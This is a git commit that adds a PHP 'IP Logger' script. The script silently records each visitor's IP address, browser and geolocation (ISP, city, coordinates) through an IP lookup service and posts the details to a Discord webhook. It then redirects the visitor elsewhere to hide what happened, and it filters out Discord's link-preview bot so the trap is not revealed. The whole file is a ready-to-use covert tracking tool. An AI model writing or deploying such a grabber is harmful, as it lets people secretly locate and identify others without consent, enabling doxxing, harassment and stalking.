3d814f64f04b9e1d489fbda876c5462be814279e
Ben Dover Now <32579538+TheBinaryDaemon@users.noreply.github.com>
2018-07-05 19:21:07 +0100

    Added the PHP script.

---
+++ IPLogger.php
@@ -0,0 +1,52 @@
+<?php
+
+//Get the IP & Info
+$IP       = $_SERVER['REMOTE_ADDR'];
+$Browser  = $_SERVER['HTTP_USER_AGENT'];
+
+//Stop us from picking up bot ips
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
+    exit();
+}
+
+//Info
+$Curl = curl_init("http://ipinfo.io/$IP/json"); //Get the info of the IP using Curl
+curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+$Info = json_decode(curl_exec($Curl)); 
+curl_close($Curl);
+
+$ISP = $Info->org;
+$Country = $Info->country;
+$Region = $Info->region;
+$City = $Info->city;
+$COORD = $Info->loc; // Coordinates
+
+//Variables
+$Webhook    = ""; //Webhook here.
+
+$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
+
+//JS we are going to send to the webhook.
+$JS = array(
+    'username'   => "$WebhookTag - IP Logger" , 
+    'avatar_url' => "https://vgy.me/GQe9bJ.png",
+    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
+);
+ 
+//Encode that JS so we can post it to the webhook
+$JSON = json_encode($JS);
+
+
+function IpToWebhook($Hook, $Content)
+{
+    //Use Curl to post to the webhook.
+      $Curl = curl_init($Hook);
+      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
+      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+      return curl_exec($Curl);
+}
+
+IpToWebhook($Webhook, $JSON);
+header("Location: https://www.littest.site");
+?>
